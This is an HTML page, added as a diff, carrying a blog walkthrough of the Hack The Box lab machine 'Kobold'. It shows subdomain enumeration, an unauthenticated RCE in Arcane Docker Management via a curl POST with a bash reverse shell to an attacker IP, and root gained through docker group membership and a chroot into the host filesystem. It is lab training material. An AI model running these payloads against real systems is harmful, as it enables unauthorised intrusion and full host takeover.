@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kobold | shreekara@sec</title>
+<meta name="description" content="HTB Kobold: unauthenticated MCP RCE (CVE-2026-23520), Docker socket abuse, chroot escape to root.">
+<link rel="icon" type="image/png" href="../../assets/img/favicon-32.png">
+<link rel="apple-touch-icon" href="../../assets/img/apple-touch-icon.png">
+<meta property="og:title" content="Kobold | shreekara@sec">
+<meta property="og:description" content="HTB Kobold: unauthenticated MCP RCE (CVE-2026-23520), Docker socket abuse, chroot escape to root.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sneakyyy.site/writeups/kobold/index.html">
+<meta property="og:image" content="../../assets/img/splash2.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<div class="site">
+<main>
+<div class="prompt-l"><span class="u">shreekara</span>@<span class="h">sneaky69</span>:~/writeups/kobold$</div>
+
+<nav class="path-nav">
+  <a href="../../index.html"><span class="tilde">~/</span>home</a>
+  <a href="../../about/index.html"><span class="tilde">~/</span>about</a>
+  <a href="../../writeups/index.html" class="active"><span class="tilde">~/</span>writeups</a>
+  <a href="../../projects/index.html"><span class="tilde">~/</span>projects</a>
+</nav>
+
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">cat</span><span class="a">kobold.md</span></div></div>
+
+<h1 style="color:var(--white);font-size:20px;margin-bottom:0.6rem;">HTB Write-Up: Kobold</h1>
+
+<table class="ptable">
+  <tr><td>Platform</td><td>Hack The Box</td></tr>
+  <tr><td>Difficulty</td><td><span class="badge easy">Easy</span></td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Author</td><td>shreekara</td></tr>
+  <tr><td>Date</td><td>June 11, 2026</td></tr>
+  <tr><td>Source</td><td><a href="https://github.com/ShreekaraKedlaya/Hackthebox-writeups/blob/main/Kobold.md" target="_blank">github.com/ShreekaraKedlaya/Hackthebox-writeups</a></td></tr>
+</table>
+
+<hr class="sep">
+
+<p class="section-lbl">Table of Contents</p>
+<pre class="cb">1. Reconnaissance
+2. Enumeration — Subdomain Discovery &amp; Version Fingerprinting
+3. Initial Access — CVE-2026-23520 (Arcane Docker Management RCE)
+4. Privilege Escalation — Docker Socket Abuse
+5. Summary &amp; Takeaways</pre>
+
+<hr class="sep">
+
+<p class="section-lbl">1. Reconnaissance</p>
+<p>Started with a targeted port scan:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">sudo nmap</span><span class="a">-sC -sV 10.129.1.254 -p22,80,443</span></div></div>
+<table class="ptable">
+  <tr><td>Port</td><td>Service</td><td style="color:var(--fg);">Details</td></tr>
+  <tr><td>22</td><td>SSH</td><td style="color:var(--fg);">OpenSSH (Ubuntu)</td></tr>
+  <tr><td>80</td><td>HTTP</td><td style="color:var(--fg);">Web server</td></tr>
+  <tr><td>443</td><td>HTTPS</td><td style="color:var(--fg);">Web server (TLS)</td></tr>
+</table>
+<p>Nothing surprising, and SSH is useless without creds, so the web server is where to start. Added <code style="color:var(--cyan);">kobold.htb</code> to <code style="color:var(--cyan);">/etc/hosts</code> and moved on.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">2. Enumeration — Subdomain Discovery &amp; Version Fingerprinting</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.1 — Virtual Host Enumeration</p>
+<p>The main page didn't have much going on, so I ran a vhost bruteforce to check for anything hiding behind the same server:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">gobuster vhost</span><span class="a">-u https://kobold.htb -w bitquark-subdomains-top100000.txt --append-domain --no-tls-validation</span></div>
+  <div class="cmd-out">mcp.kobold.htb &middot; Status: 200 [Size: 466]<br>bin.kobold.htb &middot; Status: 200 [Size: 24402]</div>
+</div>
+<p>Two subdomains. Added both to <code style="color:var(--cyan);">/etc/hosts</code> and opened them up.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.2 — Identifying the Services</p>
+<p><code style="color:var(--cyan);">bin.kobold.htb</code> turned out to be a PrivateBin instance &mdash; noted, nothing immediately exploitable, parked it. <code style="color:var(--cyan);">mcp.kobold.htb</code> was more interesting: a panel called "MCPJam" with an MCP Servers interface I hadn't seen before. Had to dig through the page source to figure out what it was actually built on &mdash; found a version string referencing <strong style="color:var(--white);">Arcane Docker Management v1.13.0</strong>. Once I had that name and version, things moved fast.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.3 — CVE Research</p>
+<p>Searching "Arcane Docker Management CVE" turned up <strong style="color:var(--red2);">CVE-2026-23520</strong> immediately &mdash; a critical unauthenticated RCE affecting v1.13.0 and below. Exact match.</p>
+<table class="ptable">
+  <tr><td>CVE</td><td>Service</td><td style="color:var(--fg);">Impact</td></tr>
+  <tr><td>CVE-2026-23520</td><td>Arcane Docker Management &le; v1.13.0</td><td style="color:var(--fg);">Unauthenticated RCE via /api/mcp/connect</td></tr>
+</table>
+
+<hr class="sep">
+
+<p class="section-lbl">3. Initial Access — CVE-2026-23520 (Arcane Docker Management RCE)</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.1 — How the Vulnerability Works</p>
+<p>The <code style="color:var(--cyan);">/api/mcp/connect</code> endpoint takes a JSON body with a <code style="color:var(--cyan);">serverConfig</code> object specifying a <code style="color:var(--cyan);">command</code> and <code style="color:var(--cyan);">args</code> to run server-side. No auth, no input validation &mdash; hand it a shell command and it runs. About as straightforward as RCE gets.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.2 — Triggering the Exploit</p>
+<p>Set up a listener, grabbed the standard bash TCP one-liner, and dropped it straight into the <code style="color:var(--cyan);">args</code> field:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">nc</span><span class="a">-lvnp 4444</span></div></div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">curl</span><span class="a">-k -X POST https://mcp.kobold.htb/api/mcp/connect -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >&amp; /dev/tcp/10.10.14.194/4444 0>&amp;1"]}}'</span></div>
+  <div class="cmd-out">connect to [10.10.14.194] from (UNKNOWN) [10.129.1.254]<br>ben@kobold:~$ id<br>uid=1001(ben) gid=1001(ben) groups=1001(ben)</div>
+</div>
+<p>In as <code style="color:var(--cyan);">ben</code>. Grabbed the user flag before doing anything else. The shell itself was rough &mdash; no tab completion, no arrow keys, Ctrl+C would kill the whole session &mdash; and my internet gave up around here too, so I called it for the night and came back the next morning.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.3 — Stabilizing the Shell</p>
+<p>First order of business the next day was upgrading to a proper TTY before touching anything else:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">python3</span><span class="a">-c 'import pty; pty.spawn("/bin/bash")'</span></div></div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">stty raw -echo; fg</span></div></div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">export</span><span class="a">TERM=xterm</span></div></div>
+<p>Proper interactive shell now. Time to look for a privesc path.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">4. Privilege Escalation — Docker Socket Abuse</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.1 — Poking Around</p>
+<p>Docker was running on the box:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">docker</span><span class="a">ps</span></div>
+  <div class="cmd-out">permission denied while trying to connect to the Docker daemon socket</div>
+</div>
+<p>Almost moved on at that point, but checked <code style="color:var(--cyan);">id</code> properly first &mdash; <code style="color:var(--cyan);">ben</code> was already in the <code style="color:var(--cyan);">docker</code> group, the active group just wasn't set yet. <code style="color:var(--cyan);">newgrp</code> fixed that for the current session:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">newgrp</span><span class="a">docker</span></div></div>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">docker</span><span class="a">ps</span></div>
+  <div class="cmd-out">privatebin/nginx-fpm-alpine:2.0.2 &middot; already pulled locally</div>
+</div>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.2 — Mounting the Host Filesystem</p>
+<p>Docker socket access is root on the host, full stop. Spun up a container as root with the entire host filesystem mounted inside:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">docker run</span><span class="a">--rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2</span></div></div>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.3 — chroot Into the Host</p>
+<div class="cmd"><div class="cmd-line"><span class="d">/ #</span><span class="c">chroot</span><span class="a">/mnt sh</span></div>
+  <div class="cmd-out">uid=0(root) gid=0(root) groups=0(root)</div>
+</div>
+<p>Root on the actual machine. Root flag at <code style="color:var(--cyan);">/root/root.txt</code>.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">5. Summary &amp; Takeaways</p>
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">Attack Chain</p>
+<table class="ptable">
+  <tr><td>Phase</td><td>Technique</td><td style="color:var(--fg);">Result</td></tr>
+  <tr><td>Recon</td><td>nmap -sC -sV</td><td style="color:var(--fg);">Ports 22, 80, 443 identified</td></tr>
+  <tr><td>Subdomain Enum</td><td>gobuster vhost</td><td style="color:var(--fg);">mcp.kobold.htb, bin.kobold.htb found</td></tr>
+  <tr><td>Fingerprinting</td><td>Page source review</td><td style="color:var(--fg);">Arcane Docker Management v1.13.0 &rarr; CVE-2026-23520</td></tr>
+  <tr><td>Initial Access</td><td>curl POST to /api/mcp/connect</td><td style="color:var(--fg);">Shell as ben + user flag</td></tr>
+  <tr><td>Privilege Escalation</td><td>newgrp docker &rarr; mount host / &rarr; chroot</td><td style="color:var(--fg);">Root shell + root flag</td></tr>
+</table>
+
+<p style="color:var(--white);font-weight:700;margin-top:1.2rem;">What I Took Away From This Box</p>
+<p style="margin-top:0.6rem;">I almost gave up on the docker angle the moment the first <code style="color:var(--cyan);">docker ps</code> came back with permission denied. It's an easy thing to skip when you're moving fast, but checking group membership properly instead of trusting the first error saved the box for me here.</p>
+<p style="margin-top:0.6rem;">The MCPJam panel didn't tell me anything about what it was running underneath at a glance &mdash; that only came from actually reading the page source. One version string in there led straight to the CVE, which is a good reminder that the boring recon step is usually the one that matters.</p>
+<p style="margin-top:0.6rem;">The bigger point though is that docker group membership is effectively root, full stop. No SUID, no sudo, no kernel exploit &mdash; just mount the host filesystem into a privileged container and chroot in. On a real system I'd treat <code style="color:var(--cyan);">docker</code> group access exactly like <code style="color:var(--cyan);">sudo</code>, and I'd never want an unauthenticated command-execution endpoint sitting on a network-reachable panel regardless of how "internal" it felt.</p>
+
+<a class="back-link" href="../../writeups/index.html">&lt; cd ~/writeups</a>
+
+</main>
+<footer>
+  <span>shreekara // security researcher</span>
+  <span><a href="../../writeups/index.html">writeups</a> · <a href="https://github.com/ShreekaraKedlaya" target="_blank">github</a></span>
+</footer>
+</div>
+</body>
+</html>
